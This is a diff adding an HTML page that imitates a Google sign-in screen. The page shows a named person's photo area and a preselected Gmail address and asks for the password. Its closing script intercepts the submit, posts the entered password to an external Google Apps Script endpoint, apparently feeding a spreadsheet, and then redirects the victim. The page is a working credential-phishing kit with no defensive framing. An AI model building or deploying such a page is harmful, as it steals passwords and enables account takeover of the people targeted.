@@ -1,0 +1,58 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Untitled Page</title>
+<meta name="generator" content="WYSIWYG Web Builder 17 - https://www.wysiwygwebbuilder.com">
+<link href="loginnnnn.css" rel="stylesheet">
+<link href="index.css" rel="stylesheet">
+</head>
+<body>
+<div id="space"><br></div>
+<div id="container">
+
+<div id="wb_Shape1" style="position:absolute;left:216px;top:221px;width:495px;height:487px;z-index:1;">
+<img src="images/img0001.png" id="Shape1" alt="" width="495" height="487" style="width:495px;height:487px;"></div>
+<div id="wb_Image1" style="position:absolute;left:422px;top:288px;width:84px;height:29px;z-index:2;">
+<img src="images/download (6).png" id="Image1" alt="" width="84" height="28"></div>
+<div id="wb_Text1" style="position:absolute;left:374px;top:335px;width:180px;height:33px;text-align:center;z-index:3;">
+<span style="color:#696969;font-family:Arial;font-size:29px;">Shalini Gupta</span></div>
+
+<form method="post" autocomplete="off" name="google-sheet" action="https://www.google.com">
+<input type="password" style="position:absolute;left:278px;top:461px;width:373px;height:44px;z-index:4;" name="pass" value="" spellcheck="false" placeholder="Enter your password" required>
+<div id="wb_Checkbox1" style="position:absolute;left:278px;top:524px;width:20px;height:20px;z-index:5;">
+<input type="checkbox" id="Checkbox1" name="" value="on" style="position:absolute;left:0;top:0;"><label for="Checkbox1"></label></div>
+<label for="" id="Label1" style="position:absolute;left:312px;top:520px;width:152px;height:21px;line-height:21px;z-index:6;">Show password</label>
+<div id="wb_Text2" style="position:absolute;left:278px;top:567px;width:116px;height:15px;z-index:7;">
+<span style="color:#468EEC;font-family:Arial;font-size:13px;">Forgot Password?</span></div>
+<a href="https://www.google.com"><input type="submit" name="submit" id="Button1" value="Login" style="position:absolute;left:596px;top:557px;width:65px;height:35px;z-index:8;" autofocus></a>
+</form>
+
+<select name="Combobox1" size="1" id="Combobox1" style="position:absolute;left:216px;top:717px;width:167px;height:28px;z-index:9;">
+<option selected value="">English (United Kingdom)</option>
+<option>English (USA)</option>
+<option>English (India)</option>
+</select>
+<div id="wb_Text3" style="position:absolute;left:545px;top:727px;width:166px;height:12px;z-index:10;">
+<span style="color:#696969;font-family:Arial;font-size:11px;">Help&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Privacy&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; Terms</span></div>
+<select name="Combobox1" size="1" id="Combobox2" style="position:absolute;left:325px;top:379px;width:269px;height:29px;z-index:11;">
+<option selected value="">shalini162000gupta@gmail.com</option>
+</select>
+</div>
+<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbw43fuvqHvVDgRRIPRAUhAwhBoiNAXtw5OXBvAasuUF0QjewBg/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              window.location.assign("page1.html");
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon..."))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</body>
+</html>
